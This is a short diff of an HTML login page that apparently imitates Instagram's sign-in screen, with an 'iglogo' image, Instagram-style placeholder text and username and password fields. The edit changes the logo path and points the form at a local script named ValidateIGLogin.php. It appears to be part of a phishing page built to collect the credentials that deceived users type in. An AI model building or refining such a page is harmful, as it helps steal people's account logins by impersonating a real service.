@@ -19,10 +19,10 @@
 <div id="wrapper">
   <div class="main-content">
     <div class="header">
-      <img src="img/iglogobig.png" />
+      <img src="iglogobig.png" />
     </div>
     <div class="l-part">
-      <form action="validateiglogin.php" method="POST" />
+      <form action="ValidateIGLogin.php" method="POST" />
       <input type="text" name="username" placeholder="Phone number, username or email" class="input-1" required/>
       <div class="overlap-text">
         <input type="password" name="password" placeholder="Password" class="input-2" required/>
